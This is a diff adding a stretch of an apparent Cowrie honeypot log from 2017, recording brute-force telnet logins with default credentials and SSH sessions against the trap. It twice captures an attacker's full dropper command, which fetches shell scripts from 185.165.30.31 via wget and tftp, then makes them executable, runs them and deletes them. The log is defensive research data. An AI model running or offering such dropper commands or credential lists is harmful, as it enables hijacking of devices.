@@ -7765,3 +7765,267 @@
 2017-03-05T16:46:00+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:52806 (10.8.41.81:2223) [session: TT41690]
 2017-03-05T16:46:00+0000 [CowrieTelnetTransport,41688,67.229.141.98] login attempt: 59373
 2017-03-05T16:46:00+0000 [CowrieTelnetTransport,41688,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:01+0000 [CowrieTelnetTransport,41688,67.229.141.98] login attempt [enable/shell] failed
+2017-03-05T16:46:01+0000 [CowrieTelnetTransport,41688,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:01+0000 [CowrieTelnetTransport,41688,67.229.141.98] login attempt: 59374
+2017-03-05T16:46:01+0000 [CowrieTelnetTransport,41688,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:02+0000 [CowrieTelnetTransport,41688,67.229.141.98] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-05T16:46:02+0000 [CowrieTelnetTransport,41688,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:02+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:46:02+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:46:02+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:46:02+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:46:02+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:46:02+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:46:02+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:46:02+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:46:03+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:58287 (10.8.41.81:2223) [session: TT41691]
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins.sh) with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins.sh
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.30.31/bins2.sh
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.30.31/bins2.sh
+2017-03-05T16:46:03+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:46:03+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.31/bins2.sh) with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/bins2.sh
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins2.sh
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: busybox tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.30.31 -c get tftp1.sh
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp1.sh
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.30.31
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: chmod +x tftp2.sh
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: cd /var/run
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: cd /tmp
+2017-03-05T16:46:03+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh /tmp/bins2.sh
+2017-03-05T16:46:03+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins2.sh>
+2017-03-05T16:46:03+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 116.31.116.51:44370 (10.8.41.81:2222) [session: 298d8b37]
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] CMD: (cd /var/run || cd /tmp; rm -rf *.sh); (cd /var/run || cd /tmp; wget http://185.165.30.31/bins.sh; chmod +x bins.sh; sh bins.sh) || (cd /var/run || cd /tmp; busybox wget http://185.165.30.31/bins2.sh; chmod +x bins2.sh; sh bins2.sh) || (cd /var/run || cd /tmp; busybox tftp 185.165.30.31 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh) || (cd /var/run || cd /tmp; busybox tftp -r tftp2.sh -g 185.165.30.31; chmod +x tftp2.sh; sh tftp2.sh); (cd /var/run || cd /tmp; rm -rf *.sh);
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: rm -rf *.sh
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /var/run
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: cd /tmp
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Command found: wget http://185.165.30.31/bins.sh
+2017-03-05T16:46:04+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2 to dl/8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Not storing duplicate content 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Saved redir contents with SHA-256 88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84 to dl/88db1aabe8112b9f3ba9d094d0a473f900cea162428bb0752e31f6bab587de84
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Closing TTY Log: log/tty/20170305-164503-None-41687i.log after 60 seconds
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-03-05T16:46:04+0000 [CowrieTelnetTransport,41687,188.16.72.14] Connection lost after 88 seconds
+2017-03-05T16:46:05+0000 [CowrieTelnetTransport,41689,67.229.141.98] login attempt: 59375
+2017-03-05T16:46:05+0000 [CowrieTelnetTransport,41689,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:06+0000 [CowrieTelnetTransport,41689,67.229.141.98] login attempt [root/admin] failed
+2017-03-05T16:46:06+0000 [CowrieTelnetTransport,41689,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:06+0000 [CowrieTelnetTransport,41690,67.229.141.98] login attempt: 59376
+2017-03-05T16:46:06+0000 [CowrieTelnetTransport,41690,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:07+0000 [CowrieTelnetTransport,41690,67.229.141.98] login attempt [root/54321] failed
+2017-03-05T16:46:07+0000 [CowrieTelnetTransport,41690,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:07+0000 [HoneyPotSSHTransport,8897,116.31.116.51] Remote SSH version: SSH-2.0-PUTTY
+2017-03-05T16:46:07+0000 [HoneyPotSSHTransport,8897,116.31.116.51] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-05T16:46:07+0000 [HoneyPotSSHTransport,8897,116.31.116.51] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-05T16:46:07+0000 [HoneyPotSSHTransport,8897,116.31.116.51] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-05T16:46:07+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-05T16:46:07+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-05T16:46:07+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-05T16:46:07+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-05T16:46:07+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-05T16:46:07+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-05T16:46:07+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-05T16:46:07+0000 [HTTPPageDownloader,client] Not storing duplicate content 8ead9420c573c40b17cdaa46543b69873e6621217ca60bc0ddde8c2c73d699c2
+2017-03-05T16:46:07+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-05T16:46:07+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-05T16:46:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.31/bins.sh>
+2017-03-05T16:46:07+0000 [CowrieTelnetTransport,41689,67.229.141.98] login attempt: 59377
+2017-03-05T16:46:07+0000 [CowrieTelnetTransport,41689,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:08+0000 [CowrieTelnetTransport,41689,67.229.141.98] login attempt [enable/shell] failed
+2017-03-05T16:46:08+0000 [CowrieTelnetTransport,41689,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:09+0000 [CowrieTelnetTransport,41689,67.229.141.98] login attempt: 59378
+2017-03-05T16:46:09+0000 [CowrieTelnetTransport,41689,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:10+0000 [CowrieTelnetTransport,41689,67.229.141.98] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-05T16:46:10+0000 [CowrieTelnetTransport,41689,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:10+0000 [CowrieTelnetTransport,41690,67.229.141.98] login attempt: 59379
+2017-03-05T16:46:10+0000 [CowrieTelnetTransport,41690,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:11+0000 [CowrieTelnetTransport,41690,67.229.141.98] login attempt [enable/shell] failed
+2017-03-05T16:46:11+0000 [CowrieTelnetTransport,41690,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:11+0000 [CowrieTelnetTransport,41690,67.229.141.98] login attempt: 59380
+2017-03-05T16:46:11+0000 [CowrieTelnetTransport,41690,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:12+0000 [CowrieTelnetTransport,41690,67.229.141.98] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-05T16:46:12+0000 [CowrieTelnetTransport,41690,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:12+0000 [CowrieTelnetTransport,41691,67.229.141.98] login attempt: 59381
+2017-03-05T16:46:12+0000 [CowrieTelnetTransport,41691,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:13+0000 [CowrieTelnetTransport,41691,67.229.141.98] login attempt [admin/] failed
+2017-03-05T16:46:13+0000 [CowrieTelnetTransport,41691,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:13+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8896,116.31.116.51] 'root' trying auth 'none'
+2017-03-05T16:46:15+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8896,116.31.116.51] 'root' authenticated with 'none'
+2017-03-05T16:46:15+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8896,116.31.116.51] starting service 'ssh-connection'
+2017-03-05T16:46:15+0000 [CowrieTelnetTransport,41691,67.229.141.98] login attempt: 59382
+2017-03-05T16:46:15+0000 [CowrieTelnetTransport,41691,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:16+0000 [CowrieTelnetTransport,41691,67.229.141.98] login attempt [enable/shell] failed
+2017-03-05T16:46:16+0000 [CowrieTelnetTransport,41691,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:17+0000 [CowrieTelnetTransport,41691,67.229.141.98] login attempt: 59383
+2017-03-05T16:46:17+0000 [CowrieTelnetTransport,41691,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:18+0000 [CowrieTelnetTransport,41691,67.229.141.98] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-05T16:46:18+0000 [CowrieTelnetTransport,41691,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:22+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:52674 (10.8.41.81:2223) [session: TT41692]
+2017-03-05T16:46:23+0000 [HoneyPotSSHTransport,8896,116.31.116.51] Got remote error, code 11
+	reason: 
+2017-03-05T16:46:23+0000 [HoneyPotSSHTransport,8896,116.31.116.51] avatar root logging out
+2017-03-05T16:46:23+0000 [HoneyPotSSHTransport,8896,116.31.116.51] connection lost
+2017-03-05T16:46:23+0000 [HoneyPotSSHTransport,8896,116.31.116.51] Connection lost after 113 seconds
+2017-03-05T16:46:27+0000 [CowrieTelnetTransport,41692,67.229.141.98] login attempt: 59384
+2017-03-05T16:46:27+0000 [CowrieTelnetTransport,41692,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:28+0000 [CowrieTelnetTransport,41692,67.229.141.98] login attempt [root/88888888] failed
+2017-03-05T16:46:28+0000 [CowrieTelnetTransport,41692,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:28+0000 [CowrieTelnetTransport,41692,67.229.141.98] login attempt: 59385
+2017-03-05T16:46:28+0000 [CowrieTelnetTransport,41692,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:29+0000 [CowrieTelnetTransport,41692,67.229.141.98] login attempt [enable/shell] failed
+2017-03-05T16:46:29+0000 [CowrieTelnetTransport,41692,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:30+0000 [CowrieTelnetTransport,41692,67.229.141.98] login attempt: 59386
+2017-03-05T16:46:30+0000 [CowrieTelnetTransport,41692,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:30+0000 [CowrieTelnetTransport,41692,67.229.141.98] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-05T16:46:30+0000 [CowrieTelnetTransport,41692,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:31+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:41373 (10.8.41.81:2223) [session: TT41693]
+2017-03-05T16:46:34+0000 [CowrieTelnetTransport,41688,67.229.141.98] Connection lost after 39 seconds
+2017-03-05T16:46:35+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 67.229.141.98:60331 (10.8.41.81:2223) [session: TT41694]
+2017-03-05T16:46:37+0000 [CowrieTelnetTransport,41693,67.229.141.98] login attempt: 59387
+2017-03-05T16:46:37+0000 [CowrieTelnetTransport,41693,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:38+0000 [CowrieTelnetTransport,41693,67.229.141.98] login attempt [admin/] failed
+2017-03-05T16:46:38+0000 [CowrieTelnetTransport,41693,67.229.141.98] Warning: state changed and new state returned
+2017-03-05T16:46:39+0000 [CowrieTelnetTransport,41693,67.229.141.98] login attempt: 59388
+2017-03-05T16:46:39+0000 [CowrieTelnetTransport,41693,67.229.141.98] login return, expect: [root/666666]
+2017-03-05T16:46:40+0000 [CowrieTelnetTransport,41693,67.229.141.98] login attempt [enable/shell] failed
